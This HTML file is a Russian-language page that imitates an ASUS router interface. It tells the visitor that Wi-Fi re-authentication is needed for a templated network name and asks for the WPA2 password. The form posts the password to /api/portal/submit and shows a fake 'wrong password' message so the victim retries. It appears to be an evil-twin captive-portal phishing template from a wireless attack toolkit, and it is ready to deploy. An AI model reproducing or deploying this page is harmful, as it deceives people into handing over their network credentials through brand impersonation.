<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>ASUS Router</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh}
.hdr{background:#0a0a0a;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #1e1e1e}
.asus-logo{color:#00A3E0;font-size:22px;font-weight:900;letter-spacing:2px}
.asus-sub{color:#555;font-size:11px}
.hero{background:linear-gradient(160deg,#0d0d0d 0%,#111827 100%);padding:32px 20px 52px;position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:-20px;right:-20px;width:200px;height:200px;background:radial-gradient(circle,rgba(0,163,224,.12),transparent 70%);border-radius:50%}
.hero h1{font-size:20px;font-weight:700;color:#fff;margin-bottom:8px;position:relative}
.hero h1 span{color:#00A3E0}
.hero p{font-size:13px;color:#8899aa;line-height:1.6;max-width:320px;position:relative}
.wrap{max-width:420px;margin:-28px auto 0;padding:0 16px 40px;position:relative}
.card{background:#161b25;border:1px solid #232d3f;border-radius:14px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
.card-label{font-size:10px;color:#00A3E0;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:16px}
.field{margin-bottom:14px}
.field label{display:block;font-size:11px;color:#556677;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
input[type=text],input[type=password]{width:100%;padding:11px 14px;border:1px solid #232d3f;border-radius:8px;font-size:14px;color:#e0e8f0;background:#0d1117;outline:none;-webkit-appearance:none}
input[type=text]:focus,input[type=password]:focus{border-color:#00A3E0;box-shadow:0 0 0 2px rgba(0,163,224,.15)}
input[readonly]{color:#445566}
.btn{width:100%;padding:13px;background:#00A3E0;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative;letter-spacing:.5px}
.btn:active{background:#0090c8}
.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
.error{display:none;background:rgba(255,60,60,.08);border:1px solid rgba(255,60,60,.2);border-radius:7px;padding:10px;font-size:12px;color:#ff6060;margin-top:10px}
.footer{text-align:center;margin-top:16px;font-size:11px;color:#334455}
</style>
</head>
<body>
<div class="hdr">
  <div class="asus-logo">ASUS</div>
  <div class="asus-sub">Router UI</div>
</div>
<div class="hero">
  <h1>ASUS <span>Router</span></h1>
  <p>Требуется повторная аутентификация для сети <strong style="color:#00A3E0">{{SSID}}</strong>. Введите пароль Wi-Fi.</p>
</div>
<div class="wrap">
  <div class="card">
    <div class="card-label">Wireless Security</div>
    <form method="POST" action="/api/portal/submit" id="frm">
      <input type="hidden" name="ssid" value="{{SSID}}">
      <input type="hidden" name="vendor" value="asus">
      <div class="field">
        <label>SSID</label>
        <input type="text" value="{{SSID}}" readonly>
      </div>
      <div class="field">
        <label>WPA2 Password</label>
        <input type="password" name="password" placeholder="Введите пароль" required autocomplete="off" minlength="8">
      </div>
      <button type="submit" class="btn" id="sbtn">
        Apply / Подтвердить
        <div class="spin" id="sp"></div>
      </button>
    </form>
    <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
  </div>
  <div class="footer">ASUSTeK Computer Inc. — Wireless Router</div>
</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  document.getElementById('sp').style.display='block';
  document.getElementById('sbtn').disabled=true;
});
if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
</script>
</body>
</html>
